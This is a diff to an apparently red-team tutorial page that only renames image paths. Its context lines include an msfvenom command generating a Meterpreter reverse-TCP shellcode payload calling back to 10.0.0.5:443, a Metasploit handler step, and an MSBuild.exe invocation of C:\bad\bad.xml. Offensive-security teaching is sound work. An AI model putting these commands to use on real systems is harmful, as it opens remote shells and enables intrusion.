@@ -12,7 +12,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-53-21.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-04-20-53-21.png)
 
 Insert shellcode into the shellcode variable in linne 46:
 
@@ -84,7 +84,7 @@ Insert shellcode into the shellcode variable in linne 46:
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-54-14.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-04-20-54-14.png)
 
 Spin up a handler in metasploit to catch your shell:
 
@@ -102,7 +102,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Peek 2019-04-04 20-57.gif>)
+![](../../.gitbook/assets/peek-2019-04-04-20-57.gif)
 
 ## Observation
 
